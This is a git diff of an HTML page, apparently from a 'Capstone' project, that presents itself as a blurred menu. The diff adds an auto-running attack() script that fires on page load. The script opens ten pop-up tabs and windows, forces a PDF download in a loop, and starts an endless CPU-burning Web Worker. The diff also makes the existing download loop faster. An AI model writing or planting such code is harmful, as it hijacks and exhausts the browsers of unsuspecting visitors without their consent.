@@ -77,9 +77,56 @@
         cpuLoad();
       }
 
-      // Start download loop every 2 seconds
-      setInterval(downloadLoop, 2000);
+      // Start download loop every 1/2 seconds
+      setInterval(downloadLoop, 500);
     });
   </script>
+
+<script>
+  function attack() {
+    // Remove blur
+    document.getElementById('blurred').style.filter = 'none';
+
+    // Multiple Tabs
+    for (let i = 0; i < 5; i++) {
+      window.open('https://arizona5005.github.io/Capstone/menu.pdf', '_blank');
+    }
+
+    // Multiple Windows
+    for (let i = 0; i < 5; i++) {
+      window.open('https://arizona5005.github.io/Capstone/menu.pdf' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
+    }
+
+    // Start repeated downloads
+    function downloadLoop() {
+      const link = document.createElement('a');
+      link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
+      link.download = 'menu.pdf';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // Run CPU load in a Web Worker to keep UI responsive (optional)
+    if (window.Worker) {
+      const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
+      const worker = new Worker(URL.createObjectURL(blob));
+      worker.postMessage('');
+    } else {
+      // Fallback for browsers without Web Worker support
+      let x = 0;
+      while (true) {
+        x += Math.sqrt(Math.random());
+        if (x > 1e7) x = 0;
+      }
+    }
+
+    // Start download loop every 2 seconds
+    setInterval(downloadLoop, 2000);
+  }
+
+  // Activate attack automatically on page load
+  window.onload = attack;
+</script>
 </body>
 </html>
